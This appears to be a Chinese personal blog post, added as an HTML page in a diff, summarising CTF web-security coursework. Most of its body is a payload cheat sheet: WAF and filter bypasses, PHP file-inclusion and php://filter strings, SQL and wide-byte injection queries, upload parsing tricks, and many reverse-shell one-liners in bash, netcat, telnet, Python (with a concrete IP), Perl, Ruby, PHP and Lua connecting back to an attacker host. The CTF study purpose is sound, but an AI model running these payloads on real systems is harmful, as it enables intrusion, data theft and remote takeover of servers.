@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/file/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/file/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/file/favicon-16x16.png">
+  <link rel="mask-icon" href="/file/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"czlz.net","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言复习之前的课程并结合做题的经验做一下小结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB小结（大比武_CTF课_小结）">
+<meta property="og:url" content="https://czlz.net/2020/jxsw_dbw_web_summary/index.html">
+<meta property="og:site_name" content="粗制乱造的个人网站">
+<meta property="og:description" content="前言复习之前的课程并结合做题的经验做一下小结">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-17T15:42:05.553Z">
+<meta property="article:author" content="粗制乱造">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="黑盒测试">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="小结">
+<meta property="article:tag" content="注入">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://czlz.net/2020/jxsw_dbw_web_summary/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>WEB小结（大比武_CTF课_小结） | 粗制乱造的个人网站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">粗制乱造的个人网站</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">杂七杂八的一堆东西</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-python">
+
+    <a href="/pyodide/" rel="section"><i class="fa fa-user fa-fw"></i>在线Python3.8</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://czlz.net/2020/jxsw_dbw_web_summary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/file/avatar.png">
+      <meta itemprop="name" content="粗制乱造">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="粗制乱造的个人网站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WEB小结（大比武_CTF课_小结）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-06T00:00:00+08:00">2020-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-17 23:42:05" itemprop="dateModified" datetime="2020-07-17T23:42:05+08:00">2020-07-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/%E5%B0%8F%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">小结</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- toc -->
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习之前的课程并结合做题的经验做一下小结</p>
+<a id="more"></a>
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><h3 id="1、输入参数绕过"><a href="#1、输入参数绕过" class="headerlink" title="1、输入参数绕过"></a>1、输入参数绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num &#x3D; aaaa   &#x2F;&#x2F;显示非法输入的话</span><br><span class="line">?%20num &#x3D; aaa</span><br></pre></td></tr></table></figure>
+<h3 id="2、绕过空格"><a href="#2、绕过空格" class="headerlink" title="2、绕过空格"></a>2、绕过空格</h3><pre><code>%20 %09 %0a %0b %0c %0d %a0 %00</code></pre><h3 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h3><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>PHP真的是漏洞之王(反正我的博客关注的人少)。下面开始总结</p>
+<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>1、include 漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br></pre></td></tr></table></figure>
+<p>绕过方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>原理：?/被当作目录了。<br>目标系统：只能在linux下使用。</p>
+<p>2、include使用PHP伪协议<br>php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h3><p>1、取反(<del>)绕过。<br>   readfile(</del>%D0%99%CE%9E%98%98);<br>2、异或(^)绕过。</p>
+<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>.user.ini配置文件自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGISAPI 处理。<br>利用条件：<br>1、服务器使用CGI／FastCGI模式。<br>2、上传目录下要有可执行的php文件<br>利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.jpg</span><br><span class="line">#让所有当前目录下可执行php文件包含1.jpg</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>当不能使用<?php>时。
+可以尝试使用
+1、<? ?><br>2、<script language="php"></script></p>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="模板攻击"><a href="#模板攻击" class="headerlink" title="模板攻击"></a>模板攻击</h3><h4 id="tornado模板泄露"><a href="#tornado模板泄露" class="headerlink" title="tornado模板泄露"></a>tornado模板泄露</h4><p>python 端模板注入(ssti攻击)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>在URL中要使用%23代替#</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata%23#</span><br></pre></td></tr></table></figure>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>参考链接：<a href="/2020/jxsw_dbw_web_1/" title="MYSQL注入绕过（大比武_CTF课_第一天）">MYSQL注入绕过（大比武_CTF课_第一天）</a></p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：<br>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">replace（）：过滤 &#39; \ ，将 &#39; 转化为 \&#39; ，将 \  转为 \\，将 &quot; 转为 \&quot; 。用思路一。</span><br><span class="line">addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&#39; , &quot; , \ 。用思路一&lt;br&gt;（防御??将mysql_query 设置为 binary 的方式）</span><br><span class="line">mysql_real_escape_string()：转义下列字符：&lt;br&gt;\x00 \n \r \ &#39; &quot; \x1a&lt;br&gt;（防御??将mysql设置为gbk即可）</span><br></pre></td></tr></table></figure>
+
+<h2 id="apache漏洞"><a href="#apache漏洞" class="headerlink" title="apache漏洞"></a>apache漏洞</h2><p>1、文件解析漏洞，文件执行是按从右到左的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php.xxx会按php执行。</span><br></pre></td></tr></table></figure>
+<p>2、%0a漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传一个1.php%0a。会被按PHP执行。但是必须是linux下。</span><br></pre></td></tr></table></figure>
+
+<h2 id="nginx漏洞"><a href="#nginx漏洞" class="headerlink" title="nginx漏洞"></a>nginx漏洞</h2><p>1、文件解析漏洞，文件执行是按从右到左的。<br>1、shell.jpg/.php</p>
+<h2 id="windows文件漏洞"><a href="#windows文件漏洞" class="headerlink" title="windows文件漏洞"></a>windows文件漏洞</h2><p>1、冒号漏洞<br>info.php:.jpg<br>info.php::$DATA<br>1.php.<br>1.php%20</p>
+<h2 id="各类shell"><a href="#各类shell" class="headerlink" title="各类shell"></a>各类shell</h2><h3 id="nmap写入shell"><a href="#nmap写入shell" class="headerlink" title="nmap写入shell"></a>nmap写入shell</h3><p>nmap   -F -oG test.php</p>
+<h3 id="Perl命令执行"><a href="#Perl命令执行" class="headerlink" title="Perl命令执行"></a>Perl命令执行</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>1.目标服务器上必须安装了libwww-perl这个库不然无法。<br>2.执行命令的目录下必须有目标文件，例如执行ls，则执行命令的目录下必须有该命令。</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当使用GET 命令时在file协议中，如果所要处理的文件存在，则会调用open方法。<br>当Perl的open看到文件以 | 结尾，它将文件解释为要执行的命令。</p>
+<p>参考链接：<a href="/2020/ctf_web_buuoj_cn_HITCON_2017_SSRF_Me_17/" title="【HITCON 2017】SSRFMe">【HITCON 2017】SSRFMe</a></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>各类反弹shell</p>
+<h4 id="0x1-Bash反弹Shell"><a href="#0x1-Bash反弹Shell" class="headerlink" title="0x1 Bash反弹Shell"></a>0x1 Bash反弹Shell</h4><p>攻击者主机上执行监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>
+<p>目标主机上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>简单解释下：</p>
+<p>bash -i   打开一个交互的bash<br>&gt;&amp;   将标准错误输出重定向到标准输出<br>/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口<br>0&gt;&amp;1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互</p>
+<blockquote>
+<p>注：<br>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
+</blockquote>
+<p>linux shell下常用的文件描述符是：<br>1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；<br>2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；<br>3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。<br>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
+<p>方法二</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;bash  -i &gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>方法三</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
+<h4 id="0x2-telnet反弹"><a href="#0x2-telnet反弹" class="headerlink" title="0x2 telnet反弹"></a>0x2 telnet反弹</h4><p>攻击者主机上打开两个终端分别执行监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br><span class="line"></span><br><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
+<p>目标主机中执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet x.x.x.x 4444 | &#x2F;bin&#x2F;bash | telnet x.x.x.x 5555</span><br></pre></td></tr></table></figure>
+<p>监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip<br>反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p>
+<h4 id="0x2-nc-netcat-反弹"><a href="#0x2-nc-netcat-反弹" class="headerlink" title="0x2 nc (netcat)反弹"></a>0x2 nc (netcat)反弹</h4><p>攻击者主机上执行监听命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>
+<p>目标主机上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash x.x.x.x port</span><br></pre></td></tr></table></figure>
+<p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f ; mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注:<br>mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</span><br><span class="line">nc x.x.x.x 4444|&#x2F;bin&#x2F;bash|nc x.x.x.x 5555</span><br><span class="line"></span><br><span class="line">nc -c &#x2F;bin&#x2F;sh x.x.x.x 4444</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;sh | nc x.x.x.x 4444</span><br></pre></td></tr></table></figure>
+<h4 id="python-Shell"><a href="#python-Shell" class="headerlink" title="python Shell"></a>python Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.2.78.175&quot;,11223));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="Perl-Shell"><a href="#Perl-Shell" class="headerlink" title="Perl Shell"></a>Perl Shell</h4><p>版本一:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;x.x.x.x&quot;;$p&#x3D;5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+<p>版本二:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="Ruby-Shell"><a href="#Ruby-Shell" class="headerlink" title="Ruby Shell"></a>Ruby Shell</h4><p>版本一:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
+<p>版本二:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP Shell"></a>PHP Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="lua-Shell"><a href="#lua-Shell" class="headerlink" title="lua Shell"></a>lua Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="通过Shell利用"><a href="#通过Shell利用" class="headerlink" title="通过Shell利用"></a>通过Shell利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
+<h2 id="Linux相关知识"><a href="#Linux相关知识" class="headerlink" title="Linux相关知识"></a>Linux相关知识</h2><h3 id="proc相关知识"><a href="#proc相关知识" class="headerlink" title="proc相关知识"></a>proc相关知识</h3><blockquote>
+</blockquote>
+<p>/proc/pid/cmdline 包含了用于开始进程的命令；<br>/proc/pid/cwd包含了当前进程工作目录的一个链接 ；<br>/proc/pid/environ 包含了可用进程环境变量的列表 ；<br>/proc/pid/exe 包含了正在进程中运行的程序链接；<br>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；<br>/proc/pid/mem 包含了进程在内存中的内容；<br>/proc/pid/stat包含了进程的状态信息；<br>/proc/pid/statm 包含了进程的内存使用信息。</p>
+<blockquote>
+<p>如果是获取当前进程下的信息时pid=self。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/file/weixin.png" alt="粗制乱造 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/file/zfb.png" alt="粗制乱造 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" rel="tag"># 黑盒测试</a>
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
+              <a href="/tags/CVE/" rel="tag"># CVE</a>
+              <a href="/tags/%E5%B0%8F%E7%BB%93/" rel="tag"># 小结</a>
+              <a href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag"># 注入</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/jxsw_dbw_web_6/" rel="prev" title="WEB复习（大比武_CTF课_第六天）">
+      <i class="fa fa-chevron-left"></i> WEB复习（大比武_CTF课_第六天）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/jxsw_dbw_web_8/" rel="next" title="WEB复习（大比武_CTF课_第八天天）">
+      WEB复习（大比武_CTF课_第八天天） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
